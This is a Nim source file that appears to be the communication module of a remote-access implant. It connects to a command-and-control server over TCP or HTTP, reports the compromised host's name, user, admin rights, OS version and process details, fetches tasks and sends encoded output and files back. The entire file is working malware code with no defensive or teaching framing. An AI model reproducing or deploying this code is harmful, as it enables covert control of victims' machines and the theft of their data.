import std/[base64, json]

when defined(tcp):
  import std/net
elif defined(http):
  import std/httpclient

import types

proc connectToC2*(app: App) =
  when defined(http) or defined(tcp):
    let j = %*{
      "task": "connect",
      "taskId": -1,
      "error": "",
      "data": {}
    }

  when defined(http):
    try:
      let token = app.httpClient.getContent(app.httpRoot & "/r")
      app.token = token
      discard app.httpClient.postContent(app.httpRoot & "/t?id=" & app.token, body=encode($j))
    except OSError: discard
  elif defined(tcp):
    try:
      app.socket = newSocket()
      app.socket.connect(app.ip, Port(app.port))
      app.socket.send(encode($j) & "\r\n")
    except OSError:
      sleep(app.autoConnectTime)

proc sendData(app: App, data: string) =
  when defined(tcp):
    try: app.socket.send(encode(data) & "\r\n")
    except: app.connectToC2()
  elif defined(http):
    try:
      discard app.httpClient.postContent(app.httpRoot & "/t?id=" & app.token, body=encode(data))
      when defined(debug):
        echo "sending " & data
    except OSError:
      return

type DataType* = enum
  File = "file", Text = "text", Code = "code", Image = "image", Object = "object"

type 
  TaskOutput* = ref object
    task*: string
    taskId*: int
    error*: string
    data*: JsonNode

proc addData*(output: TaskOutput, dataType: DataType, name: string, contents: string) =
  let enContents = newJString(encode(contents))
  if output.data.isNil():
    output.data = %*{}
  output.data[name & "::" & $dataType] = enContents

proc sendOutput*(app: App, taskOutput: TaskOutput) =
  let j = %*
    {
      "task": taskOutput.task,
      "taskId": taskOutput.taskId,
      "error": taskOutput.error,
      "data": taskOutput.data
    }
  app.sendData($j)

proc identify*(app: App, taskId: int, hostname: string, isAdmin: bool, username: string, osType: string,
              windowsVersionInfo: tuple[majorVersion: int, minorVersion: int, buildNumber: int],
              linuxVersionInfo: tuple[kernelVersion: string], ownIntegrity: string, pid: int, pname: string) =
  let taskOutput = TaskOutput(
    task: "identify",
    taskId: taskId,
    error: "",
    data: %*{}
  )

  let j = %*{
        "hostname": hostname,
        "isAdmin": isAdmin,
        "username": username,
        "osType": osType,
        "ownIntegrity": ownIntegrity,
        "pid": pid,
        "pname": $pname,
        "windowsOsVersionInfo": {
          "majorVersion": windowsVersionInfo.majorVersion,
          "minorVersion": windowsVersionInfo.minorVersion,
          "buildNumber": windowsVersionInfo.buildNumber,
        },
        "linuxOsVersionInfo": {
          "kernelVersion": linuxVersionInfo.kernelVersion
        }
      }
  
  taskOutput.data = j
  app.sendOutput(taskOutput)

proc unknownTask*(app: App, taskId: int, taskName: string) =
  let j = %*
    {
      "task": taskName,
      "taskId": taskId,
      "error": "unknown task",
      "data": {}
    }
  app.sendData($j)

proc newTaskOutput*(taskId: int): TaskOutput =
  TaskOutput(
    task: "output",
    taskId: taskId,
    error: "",
    data: %*{}
  )

proc fetchTasks*(app: App): JsonNode =
  when defined(tcp):
    try: app.socket.send("tasksplz\r\n")
    except: 
      app.connectToC2()
      return %*[]
    let line = app.socket.recvLine()
    if line.len == 0:
      app.socket.close()
    let decoded = decode(line)
    result = parseJson(decoded)
  
  elif defined(http):
    var httpResponse: string
    try:
      # fetch the tasks using our token
      httpResponse = app.httpClient.getContent(app.httpRoot & "/t?id=" & app.token)
    except OSError:
      # server is down, rebuild the http client
      # because otherwise the old connection
      # would be used (known bug)
      app.httpClient = newHttpClient()
      return %*[]
    except HttpRequestError:
      # server is back up, but our token is invalid
      # so we should refresh it
      app.connectToC2()
      return %*[]
    result = parseJson(decode(httpResponse))
